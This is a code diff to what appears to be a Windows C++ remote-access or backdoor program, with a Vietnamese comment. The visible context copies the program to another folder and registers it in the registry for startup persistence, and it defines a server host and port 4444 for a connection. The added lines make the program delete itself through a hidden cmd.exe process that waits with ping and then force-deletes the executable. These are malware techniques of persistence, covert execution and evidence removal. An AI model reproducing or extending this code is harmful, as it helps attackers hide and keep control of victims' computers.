@@ -6,10 +6,13 @@
 #include <ws2tcpip.h>
 #include <process.h>
 #include <shlwapi.h>
+#include <strsafe.h>
 
 #define SERVER_HOST "127.0.0.1"
 #define SERVER_PORT 4444
 #define DEST_PATH "D:\\Documents"
+#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")
+
 
 #pragma comment(lib, "Ws2_32.lib") 
 
@@ -44,8 +47,20 @@ void copy_addStart_del(const string& dest_path) {
     RegSetValueEx(hKey, "Script", 0, REG_SZ, (BYTE*)dest_script_path.c_str(), dest_script_path.length() + 1);
     RegCloseKey(hKey);
 
-    string scriptPath(current_script);
-    _beginthread(deleteFileAfterExit, 0, (void*)(scriptPath.c_str()));
+    //xóa
+    TCHAR szModuleName[MAX_PATH];
+    TCHAR szCmd[2 * MAX_PATH];
+    STARTUPINFO si = {0};
+    PROCESS_INFORMATION pi = {0};
+
+    GetModuleFileName(NULL, szModuleName, MAX_PATH);
+
+    StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);
+
+    CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
 }
 
 
